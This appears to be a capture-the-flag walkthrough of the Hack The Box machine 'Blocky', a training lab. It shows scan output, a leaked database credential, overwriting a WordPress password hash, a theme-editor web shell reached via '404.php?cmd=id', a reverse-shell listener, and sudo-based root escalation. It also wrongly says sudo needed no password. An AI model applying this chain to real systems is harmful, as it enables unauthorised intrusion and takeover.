![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1bbc414d-6e9b-4af8-b042-3de09db132ee)

first enumeration with nmap

```
# Nmap 7.93 scan initiated Thu Jun  1 23:35:37 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 21,80,22,8192,25565 -Pn 10.10.10.37
Nmap scan report for blocky.htb (10.10.10.37)
Host is up (0.13s latency).

PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA)
|   256 5d7f389570c9beac67a01e86e7978403 (ECDSA)
|_  256 09d5c204951a90ef87562597df837067 (ED25519)
80/tcp    open   http      Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.8
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun  1 23:35:54 2023 -- 1 IP address (1 host up) scanned in 17.19 seconds
```
add `blocky.htb` to `/etc/hosts` file.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/195696e6-0cec-4e17-beef-cd52712acaa0)

open blocky.htb on browser and see is running a wordpress service. let's use wpscan to check for any plugins or username.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ddec2a82-b941-4844-85a5-3bb5f1f2b441)

we got no plugin, but a user `Notch`. let's fuzz for hidden dirs.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Blocky]
└─$ ffuf -u "http://blocky.htb/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 403,404,500 -e .bak,.php,.txt,.tar,.zip -ic  
                                                                                   
        /'___\  /'___\           /'___\                                          
       /\ \__/ /\ \__/  __  __  /\ \__/         
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\       
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/       
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/        
                                                                                   
       v1.5.0-dev                                                                  
________________________________________________

 :: Method           : GET                                                                                                                                             
 :: URL              : http://blocky.htb/FUZZ                                                                                                                          
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt                                                                                      
 :: Extensions       : .bak .php .txt .tar .zip                                                                                                                        
 :: Follow redirects : false                                                                                                                                           
 :: Calibration      : false                                                                                                                                           
 :: Timeout          : 10                                                                                                                                              
 :: Threads          : 40                                                                                                                                              
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500                                                                                            
 :: Filter           : Response status: 403,404,500                                                                                                                    
________________________________________________                                                                                                                       
                                                                                                                                                                       
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 167ms]    
javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 133ms]
license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386, Duration: 176ms]
phpmyadmin              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 145ms]
plugins                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 161ms]
wiki                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 146ms]
wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 136ms]
wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 136ms]      
wp-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 172ms] 
wp-blog-header.php      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 202ms] 
wp-cron.php             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 142ms]
wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 145ms]
wp-links-opml.php       [Status: 200, Size: 219, Words: 12, Lines: 11, Duration: 148ms]
wp-load.php             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 159ms]    
wp-login.php            [Status: 200, Size: 2397, Words: 147, Lines: 70, Duration: 217ms]   
wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 175ms]    
wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 160ms] 
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 187ms]   
:: Progress: [28278/28278] :: Job [1/1] :: 251 req/sec :: Duration: [0:01:54] :: Errors: 0 ::
```
cool we got the hidden dirs, let's checkout the `/plugins` dir 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9917d8ee-acca-45da-a427-1585aa2353a4)

opening the dir plugins, got to see 2 files. let's download em.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Blocky]
└─$ wget http://blocky.htb/plugins/files/BlockyCore.jar                                         
--2023-06-02 00:13:58--  http://blocky.htb/plugins/files/BlockyCore.jar
Resolving blocky.htb (blocky.htb)... 10.10.10.37
Connecting to blocky.htb (blocky.htb)|10.10.10.37|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 883 [application/java-archive]
Saving to: ‘BlockyCore.jar’

BlockyCore.jar                            100%[====================================================>]  883  --.-KB/s    in 0s      

2023-06-02 00:13:58 (29.9 MB/s) - ‘BlockyCore.jar’ saved [883/883]

                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Blocky]
└─$ wget http://blocky.htb/plugins/files/griefprevention-1.11.2-3.1.1.298.jar
--2023-06-02 00:14:07--  http://blocky.htb/plugins/files/griefprevention-1.11.2-3.1.1.298.jar
Resolving blocky.htb (blocky.htb)... 10.10.10.37
Connecting to blocky.htb (blocky.htb)|10.10.10.37|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 532928 (520K) [application/java-archive]
Saving to: ‘griefprevention-1.11.2-3.1.1.298.jar’

griefprevention-1.11.2-3.1.1.298.jar      100%[=======================================================>] 520.44K   552KB/s    in 0.9s    

2023-06-02 00:14:08 (552 KB/s) - ‘griefprevention-1.11.2-3.1.1.298.jar’ saved [532928/532928]
```
got to download the .jar file. let's open it.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5584bc9e-5d3d-4f26-92e2-ced87d5f56f0)

using an online jar decomipler [java-decompiler](http://www.javadecompilers.com/result?currentfile=com/myfirstplugin/BlockyCore.java) decoded the java, and got mysql creds `root:8YsqfCTnvxAUeduzjNSXe22`. now let's move to the `phpmyadmin` dir.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/098ce077-f176-4cfc-a0ef-d7b5f0785a24)

navigate to the `phpmyadmin` dir, got redirected a login page. let's use the cred we got earlier to login.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/72e55567-7805-47b1-900a-2c449f966bd8)

Bull's eye we got in the phpmyadmin.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/906063bf-8b00-4348-b88f-1f865fe77c87)

clicking on the wordpress db and navigating to `wp_users` table. we can see the password hash of the wp_user `Notch`. let's change the password hash. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d6db081f-11ed-44bc-8515-4311bf26301b)

changed the password hash to an md5 hash which is `admin` as the password. now let's go to wp_admin.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/78d0f2d9-ede8-463c-b395-1ee0ca64bb22)

login with creds `Notch:admin`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/975c6699-10a7-4093-bec1-a915d14c0c93)

Bingo, we are in, let's upload a shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/07f0a91d-a41f-47af-b9aa-72d859647b57)

navigate to the appearance, theme editor button and edit the `404.php` file in the theme. now let's locate the shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e447cec5-8a25-43c1-b335-8e7dff4f1ffe)

locate the shell in the path `http://blocky.htb/wp-content/themes/twentyseventeen/404.php?cmd=id` and we got an RCE. let's spawn a reverse shell.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Blocky]
└─$ ncat -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.37.
Ncat: Connection from 10.10.10.37:37032.
bash: cannot set terminal process group (1466): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Blocky:/var/www/html/wp-content/themes/twentyseventeen$ id 
id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Blocky:/var/www/html/wp-content/themes/twentyseventeen$ 
```
Bingo we got a reverse shell.


## Privilege Escalation

```
www-data@Blocky:/home/notch$ su notch
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

notch@Blocky:~$
```
switching user to notch using the password got ealier for phpmyadmin, `8YsqfCTnvxAUeduzjNSXe22` boom it worked.

```
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo su
root@Blocky:/home/notch# id
uid=0(root) gid=0(root) groups=0(root)
root@Blocky:/home/notch# 
```
checking for sudo privs, we can see we are allowed to run sudo commands without specifying password. so `sudo su` got us a root shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b12d8e15-805b-4096-a42c-07a950b9fc6f)

and we are through... 😜 had fun yeah ?
